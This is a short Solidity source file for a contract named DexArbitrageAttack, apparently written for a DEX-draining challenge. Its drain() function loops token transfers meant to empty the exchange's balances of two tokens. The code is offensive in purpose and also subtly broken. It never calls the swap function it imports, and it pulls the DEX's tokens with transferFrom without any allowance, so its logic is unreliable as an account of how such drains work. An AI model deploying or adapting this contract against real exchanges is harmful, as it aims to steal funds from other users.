pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address) external view returns (uint);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IDex {
    function swap(address from, address to, uint256 amount) external;
}

contract DexArbitrageAttack {
    IDex public immutable dex;
    address public token1;
    address public token2;

    constructor(address _dexInstance, address _token1, address _token2) {
        dex = IDex(_dexInstance);
        token1 = _token1;
        token2 = _token2;
    }

    function drain() external {
        while (IERC20(token1).balanceOf(address(dex)) > 0 && IERC20(token2).balanceOf(address(dex)) > 0) {
            IERC20(token1).transferFrom(msg.sender, address(dex), IERC20(token1).balanceOf(msg.sender));
            IERC20(token2).transferFrom(msg.sender, address(dex), IERC20(token2).balanceOf(msg.sender));
            IERC20(token1).transferFrom(address(dex), msg.sender, IERC20(token1).balanceOf(address(dex)));
            IERC20(token2).transferFrom(address(dex), msg.sender, IERC20(token2).balanceOf(address(dex)));
        }
    }
}